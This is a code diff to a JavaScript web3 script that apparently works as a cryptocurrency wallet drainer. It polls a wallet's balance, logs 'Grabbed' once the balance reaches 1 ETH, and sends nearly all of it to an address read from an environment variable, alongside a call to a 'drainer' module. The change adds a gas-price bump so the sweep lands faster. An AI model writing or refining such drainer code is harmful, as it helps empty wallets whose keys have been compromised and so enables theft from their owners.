@@ -18,25 +18,28 @@ web3.eth.defaultAccount = WALLET_ADDRESS;
 const walletAccount = web3.eth.defaultAccount;
 
 async function runOnce() {
-  let balanceWei = await web3.eth.getBalance(walletAccount);
-  if (balanceWei >= 1e18) {
-    console.log('Grabbed ' + (balanceWei / 1e18) + ' ETH');
-    sendEth(balanceWei);
+  let balance = await web3.eth.getBalance(walletAccount);
+  if (balance >= 1e18) {
+    console.log('Grabbed ' + (balance / 1e18) + ' ETH');
+    sendEth(balance);
     await delay(30 * 1000);  // 30 seconds
   }
   drainer.drain(WALLET_ADDRESS, NUM_TRIALS);
 }
 
-async function sendEth(amountWei) {
+async function sendEth(amount) {
   const nonce = await web3.eth.getTransactionCount(walletAccount);
-  const gasPriceWei = await web3.eth.getGasPrice();
-  const gasCost = GAS_LIMIT * gasPriceWei;
-  const actualAmount = amountWei - gasCost;
+  let gasPrice = Number(await web3.eth.getGasPrice());
+  if (gasPrice <= 1e9) {
+    gasPrice += 1e9;
+  }
+  const gasCost = GAS_LIMIT * gasPrice;
+  const actualAmount = amount - gasCost;
   const details = {
     'to': process.env.DESTINATION_ADDRESS,
     'value': web3.utils.toHex(actualAmount),
     'gas': web3.utils.toHex(GAS_LIMIT),
-    'gasPrice': web3.utils.toHex(gasPriceWei),
+    'gasPrice': web3.utils.toHex(gasPrice),
     'nonce': nonce,
     'chainId': 3  // Ropsten
   };
